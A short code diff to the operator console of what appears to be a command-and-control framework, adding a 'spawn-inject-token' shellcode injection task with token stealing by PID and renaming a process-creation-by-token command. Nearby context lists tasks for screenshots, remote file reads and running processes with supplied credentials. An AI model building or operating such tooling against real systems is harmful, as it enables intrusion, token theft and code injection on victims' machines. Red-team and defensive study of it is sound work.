@@ -663,6 +663,8 @@ func SendChatMessage(msg string) {
 
 func SendTask(clientId string, command string, c *ishell.Context) {
 	switch command {
+	case "info":
+		PrepareTaskSimple(c, clientId, command)
 	case "sleep":
 		PrepareTaskWithOneArg(c, clientId, command, "<Sleep>: ")
 	case "jitter":
@@ -717,6 +719,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn>: ")
 	case "spawn-inject-pipe":
 		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn> <TimeoutMins>: ")
+	case "spawn-inject-token":
+		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <PathToExeToSpawn> <PidToSteal>: ")
 	case "screenshot":
 		PrepareTaskSimple(c, clientId, command)
 	case "run":
@@ -739,7 +743,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithArgs(c, clientId, command, "<pid>: ")
 	case "cat":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteFilePath>: ")
-	case "create-process-pid":
+	case "create-process-token":
 		PrepareTaskWithArgs(c, clientId, command, "<pid> <RemotePath> <binaryArgs>: ")
 	case "create-process-creds":
 		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password> <binaryPath> <binaryArgs>: ")
